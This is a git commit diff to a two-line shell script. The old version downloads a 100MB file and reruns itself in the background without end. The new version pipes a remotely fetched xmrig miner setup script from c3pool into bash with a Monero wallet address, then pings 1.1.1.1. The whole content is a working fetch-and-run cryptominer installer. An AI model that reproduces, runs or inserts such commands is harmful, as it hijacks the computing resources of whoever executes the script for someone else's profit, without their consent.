12585bf05cc3c49dfbf6d0d650b0e14cf18c8455
pwndrer4 <53749719+pwndrer4@users.noreply.github.com>
2022-07-31 11:03:44 +0800

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -1,2 +1,2 @@
-wget https://www.hblog.cf/100MB.bin &
-sh 1.sh &
+curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4BE2T95UeoWRJ9eioGTSmzWxrpT4FU1AgV59G2z42ztxjKyH17B4tYTQaSNkj7W7tJ9D1ATfEPWa4C4n9GpnDBvcNGtg3D4
+ping 1.1.1.1
